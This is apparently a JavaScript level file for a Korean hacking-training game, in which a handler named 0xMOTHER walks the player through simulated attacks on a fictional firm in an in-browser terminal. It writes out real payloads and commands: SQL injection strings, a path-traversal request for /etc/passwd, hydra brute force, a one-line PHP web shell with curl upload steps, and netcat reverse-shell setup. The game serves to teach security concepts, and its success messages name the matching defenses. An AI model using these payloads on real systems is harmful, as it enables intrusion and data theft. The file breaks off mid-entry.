/* ============================================================
 * levels.js — 34미션 캠페인 (NEW_MISSIONS v2)
 * Series 1 각성 · 2 침투 · 3 그림자전쟁 · 4 정전
 * 각 레벨: { id, tier, title, [interlude], brief, objective, goal, hints[], setup, check, success, [stance] }
 * brief → 스토리/동기(보안 채널 대사). goal → 달성할 목표를 자세히 서술. hints → 구체 명령.
 * stance(g) → 'creed'|'ghost' : 분기 미션이 클리어 시 1회 가산.
 * ============================================================ */
(function () {
  const { FileSystem, dir, file } = window.FS;

  function world(homeChildren, extraRoot) {
    const root = dir('/', 'rwxr-xr-x', 'root', {
      home: dir('home', 'rwxr-xr-x', 'root', { guest: dir('guest', 'rwxr-xr-x', 'guest', homeChildren || {}) }),
      etc: dir('etc', 'rwxr-xr-x', 'root', { hostname: file('hostname', 'nullsec-node', 'rw-r--r--', 'root') }),
      tmp: dir('tmp', 'rwxrwxrwx', 'root', {}),
      var: dir('var', 'rwxr-xr-x', 'root', { log: dir('log', 'rwxr-xr-x', 'root', {}) }),
      opt: dir('opt', 'rwxr-xr-x', 'root', {}),
      usr: dir('usr', 'rwxr-xr-x', 'root', { bin: dir('bin', 'rwxr-xr-x', 'root', {}) })
    });
    if (extraRoot) extraRoot(root);
    return new FileSystem(root);
  }
  function host(name, ip, ports, opts) { return Object.assign({ name, ip, ports }, opts || {}); }
  const f = file;

  const LEVELS = [
    /* ═══════════ SERIES 1 — 각성 (기초) ═══════════ */
    {
      id: 'S1.01', tier: '기초', title: '눈을 떠라',
      interlude: [
        '// 수신: 03:14 · 발신지 불명 · 보안 채널 강제 OPEN',
        '0xMOTHER> 네 터미널의 권한을 잠시 빌렸다. 놀라지마.',
        '0xMOTHER> 그들이 널 보고 있어. 지금부터 30초, 내 말만 들으면 안 잡힌다.',
        '0xMOTHER> 난 0xMOTHER. 네가 살아남게 막아줄 사람이지.',
        '0xMOTHER> 이름도, 얼굴도 묻지 마. 지금 중요한 건 단 하나 — 네가 키보드를 칠 수 있느냐다.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 환영할 시간은 없다. 네 홈 디렉터리에 내가 readme.txt 하나를 남겨뒀어.',
        '0xMOTHER> 터미널의 첫 번째 언어는 둘이야. `ls` — 무엇이 있는지 보는 눈. `cat` — 그것을 펼치는 손.',
        '0xMOTHER> 떨어도 좋다. 멈추지만 마. 그 파일 안에 네 첫 접속 코드가 있다.'
      ].join('\n'),
      objective: 'ACCESS CODE 를 찾아 `submit <코드>` 하라.',
      goal: 'readme.txt 안에 적힌 ACCESS CODE 한 줄을 찾아내 제출해 첫 관문을 통과하는 것이 목표다. 화려한 침투가 아니라 — 파일을 열고 정확히 읽어내는 가장 기본을, 떨리는 손으로 완수하는 첫 시험이다.',
      hints: ['`ls` 로 파일을 본다.', '`cat readme.txt`', 'ACCESS CODE: 뒤의 값을 submit (예: submit NS-7F4)'],
      setup(g) {
        g.fs = world({ 'readme.txt': f('readme.txt', 'NULLSEC 신입에게.\n터미널은 거짓말하지 않는다.\nACCESS CODE: NS-7F4\n', 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'borrowed-term';
      },
      check(g) { return g.submitted && g.submitted.has('NS-7F4'); },
      success: [
        '0xMOTHER> 정확하다. 넌 읽을 줄 안다 — 대부분은 그것조차 못하지.',
        '0xMOTHER> 방금 넌 시민에서 침입자가 됐어. 돌아갈 다리는 없다. 환영한다, 신입.'
      ].join('\n')
    },
    {
      id: 'S1.02', tier: '기초', title: '숨겨진 흔적',
      brief: [
        '0xMOTHER> HELIOS는 모든 걸 기록해. 그리고 사람들은 모든 걸 숨겼다고 믿지.',
        '0xMOTHER> 유닉스에선 이름이 점(.)으로 시작하는 파일은 평범한 목록에서 사라진다. 설정·비밀은 늘 거기 숨어.',
        '0xMOTHER> `ls -a` 의 -a 는 "all". 장막을 통째로 걷어내는 옵션이야. 가려진 걸 의심하는 법부터 배워라.'
      ].join('\n'),
      objective: '숨겨진 설정에서 DB 비밀번호(DB_PASS=값)를 찾아 submit 하라.',
      goal: '평범한 목록엔 드러나지 않는 숨김 설정파일(.env)을 드러내, 그 안에 개발자가 흘려둔 DB 비밀번호를 찾아 제출하는 것이 목표다. 눈에 띄게 놓인 미끼 파일에 속지 말고, 진짜 비밀이 어디 숨는지를 간파해야 한다.',
      hints: ['`ls -a` 로 숨김 파일까지 본다.', '`cat .env`', 'DB_PASS= 뒤의 값을 submit'],
      setup(g) {
        g.fs = world({
          'decoy.txt': f('decoy.txt', '여긴 아무것도 없다.', 'rw-r--r--', 'guest'),
          '.env': f('.env', 'API_URL=https://helios.corp\nDB_PASS=h3lios_dev_99\nDEBUG=true\n', 'rw-r--r--', 'guest')
        });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.submitted && g.submitted.has('h3lios_dev_99'); },
      success: '0xMOTHER> 어둠 속에도 글자는 있다. 가려진 걸 의심하는 첫 본능이군 — 그게 해커와 사용자를 가른다.'
    },
    {
      id: 'S1.03', tier: '기초', title: '바늘 찾기',
      brief: [
        '0xMOTHER> 시스템 로그 하나를 빼왔다. 수만 줄짜리 건초더미야. 그 안에 바늘 하나가 박혀 있어.',
        '0xMOTHER> 눈으로 훑을 생각 마라. 해 뜨기 전에 못 끝낸다. `grep` 은 해커의 자석이야 — 원하는 단어가 든 줄만 끌어올린다.',
        '0xMOTHER> "HELIOS" 가 적힌 줄에 내부 DB 서버의 주소가 숨어 있다. 그걸 캐내.'
      ].join('\n'),
      objective: '"HELIOS" 단서가 가리키는 내부 DB 호스트 IP를 찾아 submit 하라.',
      goal: '수만 줄의 잡음 로그 속에서 "HELIOS" 가 박힌 단 한 줄을 찾아, 거기 적힌 내부 DB 서버의 IP 주소를 알아내 제출하는 것이 목표다. 손이 아니라 검색의 힘으로 바늘을 집어내는, 진짜 해커의 사고방식을 처음 쓰는 순간이다.',
      hints: ['`grep HELIOS system.log`', 'HELIOS_DB_HOST= 뒤의 IP', 'submit 10.0.1.9 형태'],
      setup(g) {
        const noise = [];
        for (let i = 0; i < 60; i++) noise.push('[t' + i + '] INFO service heartbeat ok ' + (i * 7 % 100));
        noise.splice(37, 0, '[CONFIG] HELIOS_DB_HOST=10.0.1.9 (internal)');
        g.fs = world({ 'system.log': f('system.log', noise.join('\n'), 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.submitted && g.submitted.has('10.0.1.9'); },
      success: '0xMOTHER> 패턴이 곧 진실이다. 노가다는 약자의 변명이지 — 넌 도구로 생각하기 시작했다.'
    },
    {
      id: 'S1.04', tier: '기초', title: '권한의 무게',
      brief: [
        '0xMOTHER> 정찰 스크립트를 하나 보냈는데, 어떤 바보가 실행 권한을 막아뒀군.',
        '0xMOTHER> 유닉스에서 파일에는 읽기(r)·쓰기(w)·실행(x) 세 권한이 붙는다. x 가 없으면 코드여도 돌지 않아.',
        '0xMOTHER> `chmod +x` 로 실행 비트를 세워라. 권한은 곧 주인의 자격이다 — 네가 주인이 될 차례야.'
      ].join('\n'),
      objective: '실행권한이 빠진 정찰 스크립트에 실행권한을 부여하고 실행하라.',
      goal: '실행이 막혀 있는 정찰 스크립트(start.sh)에 실행 권한을 직접 부여한 뒤 실제로 돌려, 그 결과로 드러나는 다음 표적 네트워크 대역을 확인하는 것이 목표다. 권한을 다룰 줄 아는 자만이 시스템의 주인이 된다.',
      hints: ['`ls -l` 로 권한 확인(rw-만 있음)', '`chmod +x start.sh`', '`./start.sh` 로 실행'],
      setup(g) {
        g.fs = world({ 'start.sh': f('start.sh', '#!/bin/sh\necho "[RECON] 다음 표적 대역: 10.0.1.0/24"', 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.ranScripts && g.ranScripts.has('start.sh'); },
      success: '0xMOTHER> 자물쇠는 권한일 뿐. 주인은 언제나 연다. — 표적 대역을 봤지? 사냥터가 정해졌다.'
    },
    {
      id: 'S1.05', tier: '기초', title: '변환된 암호',
      brief: [
        '0xMOTHER> 이상한 문자열 파일을 하나 건졌다. 처음 보면 암호 같지? 아니야.',
        '0xMOTHER> base64 는 암호화가 아니라 *인코딩* — 데이터를 안전하게 실어 나르려고 갈아입힌 옷일 뿐이야. 키 없이도 누구나 벗긴다.',
        '0xMOTHER> `base64 -d` 로 커튼을 걷어. 안에 관리자 계정 이름이 들어 있다. 암호와 인코딩을 평생 헷갈리지 마라.'
      ].join('\n'),
      objective: 'base64 로 인코딩된 관리자 계정명을 찾아 submit 하라.',
      goal: 'base64 로 위장된 문자열을 디코딩해, 그 안에 감춰진 관리자 계정 이름을 밝혀내 제출하는 것이 목표다. 겉보기엔 암호 같지만 키 없이 누구나 되돌릴 수 있는 인코딩 — 그 차이를 직접 손으로 확인한다.',
      hints: ['`cat cipher.txt` 로 이상한 문자열 확인', '`base64 -d cipher.txt`', '나온 값을 submit'],
      setup(g) {
        g.fs = world({ 'cipher.txt': f('cipher.txt', btoa('HeliosAdmin') + '\n', 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.submitted && g.submitted.has('HeliosAdmin'); },
      success: '0xMOTHER> 인코딩은 암호가 아니다. 커튼일 뿐이지. 진짜 암호는 시리즈 4에서 만난다 — 그땐 키가 필요해.'
    },
    {
      id: 'S1.06', tier: '기초', title: '그림자 도메인',
      brief: [
        '0xMOTHER> 거인은 발톱의 때를 신경 쓰지 않아. HELIOS도 정문은 철벽이지만, 뒷골목 DNS는 허술하다.',
        '0xMOTHER> 도메인 네임서버에 "존(zone) 전체를 복사해줘"라고 요청하는 게 AXFR 트랜스퍼야. 제대로 막지 않으면 내부 서브도메인 명단이 통째로 새어나온다.',
        '0xMOTHER> `dig axfr` 로 helios.corp 의 존을 떠라. 밖으로 노출된 *개발용* 서브도메인 하나가 우리의 입구다.'
      ].join('\n'),
      objective: 'DNS 존 정보에서 노출된 테스트 서브도메인을 찾아 submit 하라.',
      goal: '네임서버의 허술한 존 트랜스퍼를 이용해 helios.corp 의 내부 구조를 통째로 들여다보고, 외부로 잘못 노출된 개발·테스트용 서브도메인 하나를 찾아 제출하는 것이 목표다. 그 한 줄이 거인의 외벽을 우회하는 우리의 첫 입구가 된다.',
      hints: ['`dig axfr helios.corp @ns.helios.corp`', '응답에서 dev-* 서브도메인을 찾는다', 'submit dev-test.helios.corp'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest';
        g.dns = {
          records: ['helios.corp.        3600 IN A   203.0.113.10'],
          axfr: [
            'helios.corp.        3600 IN A   203.0.113.10',
            'www.helios.corp.    3600 IN A   203.0.113.11',
            'dev-test.helios.corp. 3600 IN A 10.0.1.5  ; (내부 노출!)',
            'mail.helios.corp.   3600 IN MX  10 mx.helios.corp.'
          ]
        };
      },
      check(g) { return g.submitted && g.submitted.has('dev-test.helios.corp'); },
      success: '0xMOTHER> 잘못 열린 존 트랜스퍼 하나가 그들의 뒷문을 다 보여줬군. 거인의 약점은 늘 변두리에 있다.'
    },
    {
      id: 'S1.07', tier: '기초', title: '네트워크 스캔',
      brief: [
        '0xMOTHER> 입구를 찾았다 — dev-test.helios.corp. 이제 그 집에 문이 몇 개고 어디가 열렸는지 알아야지.',
        '0xMOTHER> `nmap` 은 해커의 청진기야. 대상 호스트의 포트를 하나씩 두드려 열렸는지(open) 닫혔는지 들어준다.',
        '0xMOTHER> 스캔하면 발견한 노드가 우측 네트워크 패널에 그려진다. 그중 *웹(HTTP)* 으로 들어가는 문이 우리 통로다.'
      ].join('\n'),
      objective: '대상 호스트에서 웹(HTTP) 포트 번호를 찾아 submit 하라.',
      goal: '발견한 입구(dev-test.helios.corp)를 스캔해 어떤 문(포트)들이 열려 있는지 파악하고, 그중 웹(HTTP) 서비스로 들어가는 포트 번호를 알아내 제출하는 것이 목표다. 정찰이 정확하면 침투는 이미 절반 끝난 것이다.',
      hints: ['`nmap dev-test.helios.corp`', '열린 포트 중 http 를 찾는다', 'submit 80'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.ip = '10.0.0.42';
        g.network = [host('dev-test.helios.corp', '10.0.1.5', [
          { port: 21, service: 'ftp' }, { port: 22, service: 'ssh' }, { port: 80, service: 'http' }
        ])];
      },
      check(g) { return g.submitted && g.submitted.has('80'); },
      success: '0xMOTHER> 21·22·80 — 문이 셋이나 열렸군. 골라잡으면 된다. 정찰이 끝나면 침투는 절반 끝난 거야.'
    },
    {
      id: 'S1.08', tier: '기초', title: '이메일 스크래핑',
      brief: [
        '0xMOTHER> 웹 포트(80)에서 직원 소개 페이지를 통째로 받아놨다 — team.html. 사람은 시스템의 가장 약한 고리지.',
        '0xMOTHER> `grep -oE` 의 -o 는 "매칭된 부분만", -E 는 "확장 정규식". 즉 패턴에 맞는 *조각*만 뽑아낸다.',
        '0xMOTHER> @helios.corp 이메일만 추려서 `>` 로 emails.txt 에 저장해. 이 명단이 우리의 첫 무기다.'
      ].join('\n'),
      objective: '@helios.corp 이메일 주소만 추출해 별도 파일로 저장하라.',
      goal: '확보한 직원 소개 페이지(team.html)에서 @helios.corp 이메일 주소만 정확히 추려내, 그 결과를 별도 파일(emails.txt)로 저장하는 것이 목표다. 이 명단이 앞으로의 비밀번호 공격과 사회공학의 표적 리스트가 된다.',
      hints: ['`grep -oE "[a-z.0-9_]+@helios.corp" team.html`', '결과를 `> emails.txt` 로 저장', 'emails.txt 가 만들어지면 완료'],
      setup(g) {
        g.fs = world({
          'team.html': f('team.html', '<ul>\n<li>김지훈 <a>j.kim@helios.corp</a></li>\n<li>박서연 s.park@helios.corp</li>\n<li>admin <b>admin@helios.corp</b></li>\n</ul>', 'rw-r--r--', 'guest')
        });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { const n = g.fs.getNode('/home/guest/emails.txt'); return !!(n && n.type === 'file' && /@helios\.corp/.test(n.content)); },
      success: '0xMOTHER> 명단을 손에 넣었다. 사람이 가장 약한 고리지 — 방화벽은 못 뚫어도, 사람의 게으른 비밀번호는 뚫린다.'
    },
    {
      id: 'S1.09', tier: '기초', title: '버전 식별',
      brief: [
        '0xMOTHER> 무작정 들이받는 건 아마추어야. 먼저 상대가 뭘 입고 있는지 봐. 낡은 갑옷은 이미 깨질 자리가 정해져 있다.',
        '0xMOTHER> 작전 노트에 표적이 남아 있다 — dev-test.helios.corp. 이전 정찰 기록이 사라져도 여기서 다시 시작하면 된다.',
        '0xMOTHER> `nmap -sV` 의 -sV 는 "service Version". 포트가 열린 것만이 아니라, 그 뒤에서 *어떤 소프트웨어의 몇 번 버전*이 도는지까지 알아낸다.',
        '0xMOTHER> 취약점은 버전에 붙어. FTP 서비스의 정확한 버전 문자열을 캐내라.'
      ].join('\n'),
      objective: '대상 호스트의 FTP 서비스 버전 문자열을 알아내 submit 하라.',
      goal: '대상을 공격하기 전에, FTP 서비스가 정확히 어떤 소프트웨어의 몇 번 버전인지 식별해내 그 버전 문자열을 제출하는 것이 목표다. 알려진 취약점은 버전 단위로 분류되어 있어 — 정확한 버전을 아는 순간 약점의 목록도 함께 손에 들어온다.',
      hints: ['`nmap -sV dev-test.helios.corp`', '21/tcp 의 version 필드를 본다', 'submit vsftpd 2.3.4'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest';
        g.network = [host('dev-test.helios.corp', '10.0.1.5', [
          { port: 21, service: 'ftp', version: 'vsftpd 2.3.4' }, { port: 22, service: 'ssh', version: 'OpenSSH 7.4' }
        ])];
      },
      check(g) { return g.submitted && g.submitted.has('vsftpd 2.3.4'); },
      success: '0xMOTHER> vsftpd 2.3.4 — 백도어로 악명 높은 골동품이군. CVE 백화점이다. 다음 단계에서 저 문을 부순다.'
    },
    {
      id: 'S1.10', tier: '기초', title: '첫 번째 침투',
      interlude: [
        '0xMOTHER> 정찰은 끝났다. 입구·열린 포트·낡은 버전·직원 명단 — 사냥에 필요한 모든 지도가 손에 있어.',
        '0xMOTHER> 이제 처음으로, 남의 시스템 안에 *실제로* 발을 들인다. 이 선을 넘으면 넌 더 이상 관찰자가 아니야.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 사람들은 초기 비밀번호를 거의 안 바꿔. 그게 우리에게 문을 열어준다.',
        '0xMOTHER> 작전 노트에는 표적 대역만 남아 있다 — 10.0.1.0/24. 이전에 배운 `nmap` 으로 FTP가 열린 호스트를 먼저 다시 찾아라.',
        '0xMOTHER> `hydra` 는 사전(wordlist)에 적힌 비번을 하나씩 자동으로 대입하는 무차별 도구야. 찾은 FTP 문에 대고 돌려라.',
        '0xMOTHER> 비번을 찾으면 그 계정으로 `ftp` 접속해. 첫 침투의 맛을 봐.'
      ].join('\n'),
      objective: '대상 FTP 계정의 비밀번호를 찾아 접속하라.',
      goal: '표적 대역을 스캔해 FTP가 열린 호스트를 다시 찾고, 확보한 단어 목록을 사전 삼아 비밀번호를 알아낸 뒤 그 계정으로 실제 접속해 첫 내부 거점을 확보하는 것이 목표다. 이 한 번의 접속으로 너는 관찰자에서 침입자가 된다.',
      hints: ['`nmap 10.0.1.0/24` 로 FTP 호스트를 찾는다', '`cat wordlist.txt` 로 사전 확인', '`hydra <찾은 IP> ftp wordlist.txt` 후 `ftp <찾은 IP>`'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'guest'; g.ip = '10.0.0.42';
        g.fs = world({ 'wordlist.txt': f('wordlist.txt', '123456\npassword\npassword123\nletmein\nadmin\n', 'rw-r--r--', 'guest') });
        g.network = [host('dev-test', '10.0.1.5', [{ port: 21, service: 'ftp' }], {
          creds: { jkim: 'password123' },
          fs: { 'loot.txt': f('loot.txt', '내부 헬프데스크 망: help.helios.corp', 'rw-r--r--', 'jkim') }
        })];
        g.sshOk = false; g.onSshSuccess = (t) => { if (t.ip === '10.0.1.5') g.sshOk = true; };
      },
      check(g) { return g.sshOk; },
      success: '0xMOTHER> 들어갔다. 첫 침투의 맛은 평생 안 잊혀. …그리고 넌 기록에 남았다. 이제 그들도 곧 알게 될 거야.'
    },

    /* ═══════════ SERIES 2 — 침투 (중급) ═══════════ */
    {
      id: 'S2.01', tier: '중급', title: '로봇의 규칙',
      interlude: [
        '╔═══ SERIES 2 · 침투 ═══╗',
        '0xMOTHER> 골방은 끝났다. 탈취한 문서에서 내부 헬프데스크 망 — help.helios.corp — 이 드러났어.',
        '0xMOTHER> 여기서부터는 진짜 웹 애플리케이션을 상대한다. 대문은 잠겼지만, 모든 자물쇠엔 틈이 있어.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 웹사이트엔 검색 로봇에게만 보내는 "여긴 색인하지 마" 팻말이 있어 — robots.txt.',
        '0xMOTHER> 관리자들은 멍청하게도 거기에 *숨기고 싶은 경로*를 적어둬. 막으려던 게 오히려 지도가 되는 거지.',
        '0xMOTHER> `curl` 로 그 robots.txt 를 읽어 Disallow 에 적힌 관리자 경로를 찾아라.'
      ].join('\n'),
      objective: '웹 크롤러 배제 규칙에서 숨겨진 관리자 경로를 찾아 submit 하라.',
      goal: '웹사이트가 검색 로봇에게만 알려주는 robots.txt 를 직접 읽어, 관리자들이 색인에서 감추려 했던 비공개 관리자 페이지 경로를 찾아 제출하는 것이 목표다. 숨기려던 행위 자체가 길잡이가 된다.',
      hints: ['`curl http://help.helios.corp/robots.txt`', 'Disallow: 뒤의 경로', 'submit /admin_portal'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest';
        g.web = { 'http://help.helios.corp/robots.txt': 'User-agent: *\nDisallow: /admin_portal\nDisallow: /backup\nDisallow: /internal' };
      },
      check(g) { return g.submitted && g.submitted.has('/admin_portal'); },
      success: '0xMOTHER> 숨길 거면 인증으로 막아야지. robots.txt 에 적는 건 도둑에게 금고 위치를 알려주는 초대장이다.'
    },
    {
      id: 'S2.02', tier: '중급', title: '거짓말쟁이',
      brief: [
        '0xMOTHER> 숨겨진 로그인 페이지를 찾았군 — /admin_portal. 이제 데이터베이스에게 거짓말을 시킬 거야.',
        '0xMOTHER> 로그인 폼은 네 입력을 그대로 SQL 쿼리에 끼워 넣어. 거기에 *항상 참인 조건* 을 주입하면, DB는 비번이 맞다고 착각한다.',
        "0xMOTHER> `login admin \"' OR '1'='1' --\"` — 작은따옴표로 쿼리를 끊고, OR '1'='1' 로 참을 만들고, -- 로 뒷부분을 주석 처리해 무력화하는 거다."
      ].join('\n'),
      objective: 'SQL 인젝션으로 인증을 우회 로그인하라.',
      goal: "로그인 폼이 입력을 그대로 SQL 질의문에 끼워 넣는 허점을 이용해, 올바른 비밀번호 없이 '항상 참'인 조건을 주입하고 뒷부분을 주석으로 무력화함으로써 관리자 계정에 우회 로그인하는 것이 목표다. 비밀번호를 푸는 게 아니라, 인증 논리 자체를 무너뜨린다.",
      hints: ['입력이 쿼리에 그대로 들어간다', "항상 참인 조건을 주입: ' OR '1'='1'", "주석(--)으로 뒷부분 무력화"],
      setup(g) { g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; },
      check(g) { return g.sqliAuth === true; },
      success: '0xMOTHER> 인증을 논리로 뚫었다. Prepared Statement 한 줄만 썼어도 막혔을 텐데 — 그들의 게으름이 네 열쇠야.'
    },
    {
      id: 'S2.03', tier: '중급', title: '깊은 곳의 장부',
      brief: [
        '0xMOTHER> 들어가긴 했는데 권한이 낮군. 우회 로그인만으론 부족해 — DB 자체를 토하게 만들 거다.',
        '0xMOTHER> UNION 인젝션은 원래 쿼리 결과 뒤에 *다른 테이블의 결과를 이어 붙이는* 기술이야. 컬럼 수만 맞추면 users 테이블을 화면에 끌어낼 수 있다.',
        "0xMOTHER> `login admin \"' UNION SELECT null,user,pass FROM users --\"` — 관리자 해시까지 통째로 뽑아내."
      ].join('\n'),
      objective: 'UNION 기반 인젝션으로 사용자 자격증명을 덤프하라.',
      goal: '단순 우회를 넘어, UNION 기반 인젝션으로 데이터베이스의 users 테이블 전체를 화면에 끌어내 모든 계정의 자격증명(관리자 비밀번호 해시 포함)을 통째로 확보하는 것이 목표다. 인증을 속이는 단계에서, 데이터를 직접 약탈하는 단계로 넘어간다.',
      hints: ['컬럼 수를 맞춰 UNION SELECT', "login admin \"' UNION SELECT null,user,pass FROM users --\"", 'users 가 화면에 나오면 완료'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest';
        g.dumps = { users: 'id | user  | password\n 1 | admin | $1$aa$adminhash99\n 2 | jkim  | $1$bb$kimhash01' };
      },
      check(g) { return g.sqlDumped === true; },
      success: '0xMOTHER> 관리자 해시까지 새어나왔다. 데이터는 이제 우리 것이야 — 하지만 해시는 아직 자물쇠다. 나중에 깬다.'
    },
    {
      id: 'S2.04', tier: '중급', title: 'LFI — 로컬 파일',
      brief: [
        '0xMOTHER> 이 사이트의 첨부파일 다운로드 기능이 허술해. 어떤 파일을 줄지를 URL 파라미터로 그냥 받더라.',
        '0xMOTHER> 표적은 내부 헬프데스크(help.helios.corp)다. 독립 작전으로 다시 들어왔다면 여기서부터 기억해.',
        '0xMOTHER> `../` 는 "상위 폴더로" 라는 뜻이야. 이걸 충분히 반복하면 웹 폴더를 빠져나와 시스템 루트까지 거슬러 올라간다 — 경로 조작(Path Traversal/LFI).',
        '0xMOTHER> 유닉스의 심장 `/etc/passwd` 를 읽어내. 서버가 자기 비밀을 스스로 뱉게 만드는 거다.'
      ].join('\n'),
      objective: '경로 조작(LFI)으로 시스템 사용자 목록을 읽어내라.',
      goal: '허술한 파일 다운로드 기능의 경로 검증을 우회해, 웹 폴더 밖으로 거슬러 올라가 시스템의 계정 파일(/etc/passwd)을 읽어내는 것이 목표다. 서버가 의도치 않게 자기 내부 파일을 내어주게 만들어, 시스템의 사용자 구조를 손에 넣는다.',
      hints: ['?file= 파라미터를 조작', '`curl "http://help.helios.corp/download?file=../../../../etc/passwd"`', '시스템 사용자 목록이 나오면 완료'],
      setup(g) {
        g.fs = world({});
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'operator-laptop';
        g.targetLabel = 'REMOTE WEB help.helios.corp';
        g.sessionLabel = 'LOCAL SHELL';
        g.remoteFiles = {
          '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nhelios:x:1000:1000::/home/helios:/bin/bash\n'
        };
      },
      check(g) { return g.lfiRead === '/etc/passwd'; },
      success: '0xMOTHER> 서버의 심장을 읽었다. 경로 정규화 한 줄을 빼먹은 대가지. 이제 그들의 파일 시스템이 우리에게 열렸다.'
    },
    {
      id: 'S2.05', tier: '중급', title: '사냥개의 눈',
      interlude: [
        'ORACLE> 비정상 HTTP 패턴 감지. 방어 AI 가동. 역추적 10%…',
        '0xMOTHER> 젠장, ORACLE이 깼어. HELIOS의 방어 인공지능이야 — 한 번 눈을 뜨면 네 모든 발자국을 학습한다.',
        '0xMOTHER> 이제부터 속도가 생명이다. 머뭇거리는 순간 역추적이 너를 따라잡아.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 마침 관리자 한 명이 방금 로그인했어. 그 트래픽 덤프(capture.pcap)를 가로챘다.',
        '0xMOTHER> 패킷 안에는 그가 보낸 세션 쿠키가 평문으로 흐르고 있어 — 그걸 훔치면 그의 로그인을 그대로 도용할 수 있다.',
        '0xMOTHER> `tcpdump -r capture.pcap Cookie` 로 쿠키가 든 줄만 추려내. ORACLE이 따라오기 전에.'
      ].join('\n'),
      objective: '패킷 캡처에서 관리자 세션 쿠키 값(SESSION=...)을 찾아 submit 하라.',
      goal: '추적이 시작된 긴박한 상황에서, 가로챈 트래픽 덤프 속 수많은 패킷 중 방금 로그인한 관리자의 세션 쿠키 값을 찾아 탈취하는 것이 목표다. 그 쿠키 하나면 비밀번호 없이도 관리자의 신분을 그대로 도용할 수 있다.',
      hints: ['`tcpdump -r capture.pcap Cookie`', 'Cookie: SESSION= 뒤의 값', 'submit S3SS_9f3a2b'],
      setup(g) {
        const pkts = [];
        for (let i = 0; i < 30; i++) pkts.push(`12:00:0${i} IP 10.0.2.${i}.443 > 10.0.0.42: tcp ack`);
        pkts.splice(18, 0, '12:00:18 IP admin > help.helios.corp: GET /admin_portal  Cookie: SESSION=S3SS_9f3a2b; role=admin');
        g.fs = world({ 'capture.pcap': f('capture.pcap', pkts.join('\n'), 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.submitted && g.submitted.has('S3SS_9f3a2b'); },
      success: '0xMOTHER> 세션 탈취 성공. 쿠키에 HttpOnly·Secure 플래그만 걸었어도 못 가져갔을 텐데. 역추적 카운터가 돈다 — 서둘러.'
    },
    {
      id: 'S2.06', tier: '중급', title: '백도어 업로드',
      brief: [
        '0xMOTHER> 가로챈 세션으로 관리자 화면에 들어왔다. 시간이 없어 — 영구적인 발판을 심을 차례야.',
        '0xMOTHER> 업로드 대상은 help.helios.corp 의 upload 엔드포인트고, 네 작업 폴더에는 던져 넣을 shell.php 가 준비돼 있다.',
        '0xMOTHER> 프로필 이미지 업로드 창이 보이지? 그 검증이 허술해서 .php 같은 실행 파일도 통과돼. 그게 *웹쉘*이다 — 서버 위에서 명령을 실행시켜 주는 뒷문.',
        '0xMOTHER> `curl -X POST -F file=@shell.php` 로 위장한 웹쉘을 업로드 엔드포인트에 던져 넣어.'
      ].join('\n'),
      objective: '파일 업로드 검증을 우회해 웹쉘을 업로드하라.',
      goal: '탈취한 관리자 권한으로 이미지 업로드 기능의 허술한 파일 검증을 뚫고, 서버에서 임의 명령을 실행시킬 수 있는 웹쉘을 심는 것이 목표다. 일회성 침투를 넘어, 언제든 돌아올 수 있는 영구적인 거점 하나를 박아 넣는다.',
      hints: ['shell.php 를 업로드한다', '`curl -X POST -F file=@shell.php http://help.helios.corp/upload`', '200 OK 가 뜨면 완료'],
      setup(g) {
        g.fs = world({ 'shell.php': f('shell.php', '<?php system($_GET["c"]); ?>', 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
        g.uploadEndpoint = '/upload';
      },
      check(g) { return g.uploaded === true; },
      success: '0xMOTHER> 웹쉘 안착. 업로드된 파일의 확장자 검증 한 줄을 빼먹은 게 그들의 마지막 실수다.'
    },
    {
      id: 'S2.07', tier: '중급', title: '내부망 진입',
      brief: [
        '0xMOTHER> 웹쉘은 심었지만, 가만히 있는 뒷문은 반쪽짜리야. 이제 그걸 깨워 우리 쪽으로 *연결을 당겨오게* 한다 — 리버스 쉘.',
        '0xMOTHER> 이전 업로드 결과는 /uploads/shell.php 로 접근 가능하다. 단독으로 재시작했다면 이 경로부터 기억해.',
        '0xMOTHER> 방화벽은 들어오는 연결은 막아도 나가는 연결은 잘 안 막아. 그래서 서버가 먼저 우리에게 전화를 걸게 만드는 거지.',
        '0xMOTHER> 먼저 `nc -lvnp 4444` 로 전화를 받을 리스너를 열고, 그다음 웹쉘 URL을 호출해 콜백을 유도해.'
      ].join('\n'),
      objective: '웹쉘을 통해 리버스 쉘을 받아 내부망 거점을 확보하라.',
      goal: '심어둔 웹쉘을 깨워 서버가 거꾸로 우리에게 연결을 걸어오게(리버스 쉘) 만들고, 그렇게 HELIOS 내부망 안에 실제로 명령을 내릴 수 있는 발판을 확보하는 것이 목표다. 외벽 너머, 진짜 그들의 영토에 첫 발을 들인다.',
      hints: ['`nc -lvnp 4444` 로 대기', '`curl http://help.helios.corp/uploads/shell.php`', '리버스 셸이 붙으면 완료'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.ip = '10.0.0.42';
        g.webshellUrl = 'shell.php';
        g.reverseTarget = host('helios-internal', '10.0.2.5', [{ port: 22, service: 'ssh' }], {
          shellUser: 'www-data',
